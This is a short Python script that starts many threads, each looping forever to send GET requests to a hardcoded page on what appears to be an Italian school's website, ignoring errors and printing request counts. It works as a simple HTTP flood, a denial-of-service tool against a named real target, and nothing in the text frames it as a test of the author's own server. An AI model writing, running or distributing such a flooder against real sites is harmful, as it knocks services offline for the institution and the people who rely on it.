import requests, threading, time, os

I=0
nThreads = int(os.environ.get("THREADS", "50"))
TIMEOUT = float(os.environ.get("TIMEOUT", "0.5"))
LINK = os.environ.get("LINK", "https://www.liceoischia.edu.it/index.php/cerca-nel-sito/11-generale/167-foto-01")

threads = []

print(f"Starting {nThreads} threads with {TIMEOUT} seconds of timeout")

def do_request_hv():
    global I
    while True:
        t1 = time.time()
        try:
            requests.get(LINK, timeout=TIMEOUT)
        except:
            pass
        I=I+1
        print('Req n:{0} took: {1:.5f} s'.format(I, time.time() - t1))

def do_request_nhv():
    global I
    while True:
        try:
            requests.get(LINK, timeout=TIMEOUT)
        except:
            pass
        I=I+1

for z in range(nThreads):
    
    if z % 15 == 0:
        t = threading.Thread(target=do_request_hv)
    else:
        t = threading.Thread(target=do_request_nhv)
    t.daemon = True
    threads.append(t)

for y in range(nThreads):
    threads[y].start()

for y in range(nThreads):
    threads[y].join()